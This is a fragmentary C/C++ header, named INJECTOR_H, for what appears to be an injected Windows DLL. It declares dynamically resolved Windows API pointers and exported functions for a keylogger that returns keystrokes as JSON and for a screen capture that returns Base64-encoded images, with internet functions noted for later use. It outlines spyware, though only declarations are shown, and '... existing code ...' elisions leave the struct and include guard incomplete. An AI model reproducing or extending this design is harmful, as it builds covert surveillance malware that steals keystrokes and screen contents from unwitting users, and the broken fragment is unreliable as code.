#include <windows.h>
#include <wininet.h> // For internet functions if needed later
#include <tlhelp32.h> // For process snapshot
#include <vector>
#include <string>
#include <mutex>
#include <thread> // For keylogger thread
#include <atomic> // For keylogger thread control
#include <nlohmann/json.hpp> // For JSON logging
#include <wincrypt.h> // For Base64 encoding (CryptBinaryToStringA)

#ifdef __cplusplus
extern "C" {
#endif

// Function pointer types for Keylogger
typedef LRESULT (CALLBACK* HOOKPROC)(int nCode, WPARAM wParam, LPARAM lParam);
typedef HHOOK (WINAPI* SetWindowsHookExW_t)(int idHook, HOOKPROC lpfn, HINSTANCE hMod, DWORD dwThreadId);
typedef BOOL (WINAPI* UnhookWindowsHookEx_t)(HHOOK hhk);
typedef LRESULT (WINAPI* CallNextHookEx_t)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
typedef SHORT (WINAPI* GetAsyncKeyState_t)(int vKey);
typedef BOOL (WINAPI* GetMessageW_t)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
typedef BOOL (WINAPI* TranslateMessage_t)(const MSG *lpMsg);
typedef LRESULT (WINAPI* DispatchMessageW_t)(const MSG *lpMsg);
typedef int (WINAPI* ToUnicode_t)(UINT wVirtKey, UINT wScanCode, const BYTE *lpKeyState, LPWSTR pwszBuff, int cchBuff, UINT wFlags);
typedef BOOL (WINAPI* GetKeyboardState_t)(PBYTE lpKeyState);
typedef int (WINAPI* WideCharToMultiByte_t)(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);

// Function pointer types for Screenshot
typedef HDC (WINAPI* GetDC_t)(HWND hWnd);
typedef HDC (WINAPI* CreateCompatibleDC_t)(HDC hdc);
typedef HBITMAP (WINAPI* CreateCompatibleBitmap_t)(HDC hdc, int cx, int cy);
typedef HGDIOBJ (WINAPI* SelectObject_t)(HDC hdc, HGDIOBJ h);
typedef BOOL (WINAPI* BitBlt_t)(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
typedef int (WINAPI* GetDeviceCaps_t)(HDC hdc, int index);
typedef int (WINAPI* ReleaseDC_t)(HWND hWnd, HDC hDC);
typedef BOOL (WINAPI* DeleteDC_t)(HDC hdc);
typedef BOOL (WINAPI* DeleteObject_t)(HGDIOBJ ho);
typedef int (WINAPI* GetDIBits_t)(HDC hdc, HBITMAP hbm, UINT start, UINT cLines, LPVOID lpvBits, LPBITMAPINFO lpbmi, UINT usage);

// Function pointer types for Base64 encoding (Crypt32.dll)
typedef BOOL (WINAPI* CryptBinaryToStringA_t)(const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD *pcchString);


// ... existing code ...

    UnhookWindowsHookEx_t RealUnhookWindowsHookEx;
    CallNextHookEx_t RealCallNextHookEx;
    GetAsyncKeyState_t RealGetAsyncKeyState;
    GetMessageW_t RealGetMessageW;
    TranslateMessage_t RealTranslateMessage;
    DispatchMessageW_t RealDispatchMessageW;
    ToUnicode_t RealToUnicode;
    GetKeyboardState_t RealGetKeyboardState;
    WideCharToMultiByte_t RealWideCharToMultiByte;

    // Screenshot functions (User32.dll, Gdi32.dll)
    GetDC_t RealGetDC;
    ReleaseDC_t RealReleaseDC;
    GetDeviceCaps_t RealGetDeviceCaps;
    CreateCompatibleDC_t RealCreateCompatibleDC;
    CreateCompatibleBitmap_t RealCreateCompatibleBitmap;
    SelectObject_t RealSelectObject;
    BitBlt_t RealBitBlt;
    DeleteDC_t RealDeleteDC;
    DeleteObject_t RealDeleteObject;
    GetDIBits_t RealGetDIBits;

    // Base64 Encoding (Crypt32.dll)
    CryptBinaryToStringA_t RealCryptBinaryToStringA;

} ApiPointers;

// ... existing code ...

// Keylogger functions
__declspec(dllexport) bool StartKeylogger();
__declspec(dllexport) bool StopKeylogger();
__declspec(dllexport) const char* GetKeyLogs(); // Returns JSON array string, caller doesn't free
__declspec(dllexport) void FreeKeyLogsBuffer(const char* buffer); // Function to free the string returned by GetKeyLogs if needed (currently not needed as buffer is managed internally)

// Screenshot function
__declspec(dllexport) char* CaptureScreenshot(); // Returns Base64 encoded BMP string, caller MUST free using FreeScreenshotData
__declspec(dllexport) void FreeScreenshotData(char* data); // Frees the memory allocated by CaptureScreenshot


#ifdef __cplusplus
}
#endif

#endif // INJECTOR_H 